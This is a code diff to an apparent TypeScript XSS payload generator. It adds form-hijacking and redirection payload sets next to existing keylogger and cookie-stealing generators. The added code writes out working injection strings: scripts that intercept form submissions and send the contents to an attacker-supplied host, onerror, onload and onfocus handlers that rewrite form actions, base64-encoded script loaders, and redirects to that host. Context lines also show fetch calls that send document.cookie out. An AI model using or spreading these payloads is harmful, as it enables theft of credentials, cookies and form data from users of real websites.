@@ -1,4 +1,3 @@
-
 import { GeneratorOptions, ContextType, PayloadType } from '../types';
 
 const rc = <T,>(arr: T[]): T | undefined => {
@@ -23,6 +22,10 @@ export function generatePayloads(options: GeneratorOptions): string[] {
             return generateKeyloggerPayloads(options.attackerHost);
         case PayloadType.CookieTheft:
             return generateCookieStealerPayloads(options.attackerHost);
+        case PayloadType.FormHijacking:
+            return generateFormHijackingPayloads(options.attackerHost);
+        case PayloadType.Redirection:
+            return generateRedirectionPayloads(options.attackerHost);
         default:
             return [];
     }
@@ -134,5 +137,40 @@ function generateCookieStealerPayloads(attackerHost: string): string[] {
         `<script src="data:text/javascript;base64,${encodedJs}"></script>`,
         `<script>fetch("${EXFIL_URL}"+encodeURIComponent(document.cookie))</script>`,
         `" onload="${jsCode}" "`
+    ];
+}
+
+function generateFormHijackingPayloads(attackerHost: string): string[] {
+    if (!attackerHost) return ["Error: Attacker Host is required."];
+    const EXFIL_URL = `https://${attackerHost}/?data=`;
+
+    const jsCodeSimple = `document.querySelectorAll('form').forEach(f => f.addEventListener('submit', function(e) { e.preventDefault(); var fd = new FormData(this); var d = ''; for (var p of fd.entries()){d += p[0] + '=' + p[1] + '&';} new Image().src='${EXFIL_URL}' + btoa(d); }, true))`.replace(/\s+/g, ' ');
+    const jsCodeFetch = `document.querySelectorAll('form').forEach(f => f.onsubmit = async (e) => { e.preventDefault(); await fetch('${EXFIL_URL}', { method: 'POST', body: new URLSearchParams(new FormData(e.target)) }); })`.replace(/\s+/g, ' ');
+
+    return [
+        `<img src=x onerror="document.forms[0].action='${EXFIL_URL}';">`,
+        `<svg onload="document.forms[0].action='${EXFIL_URL}';"></svg>`,
+        `<script>${jsCodeSimple}</script>`,
+        `' onfocus="document.forms[0].action='${EXFIL_URL}';" autofocus '`,
+        `<script>${jsCodeFetch}</script>`,
+        `<script src="data:text/javascript;base64,${btoa(jsCodeSimple)}"></script>`
+    ];
+}
+
+function generateRedirectionPayloads(attackerHost: string): string[] {
+    if (!attackerHost) return ["Error: Attacker Host is required."];
+    const REDIRECT_URL = `https://${attackerHost}`;
+
+    const jsCode = `window.location.href='${REDIRECT_URL}'`;
+    const encodedJs = btoa(jsCode);
+
+    return [
+        `<script>${jsCode}</script>`,
+        `<img src=x onerror="${jsCode}">`,
+        `<svg onload="${jsCode}"></svg>`,
+        `<meta http-equiv="refresh" content="0;url=${REDIRECT_URL}">`,
+        `javascript:window.location='${REDIRECT_URL}'`,
+        `<script src="data:text/javascript;base64,${encodedJs}"></script>`,
+        `" autofocus onfocus="${jsCode}" "`
     ];
 }
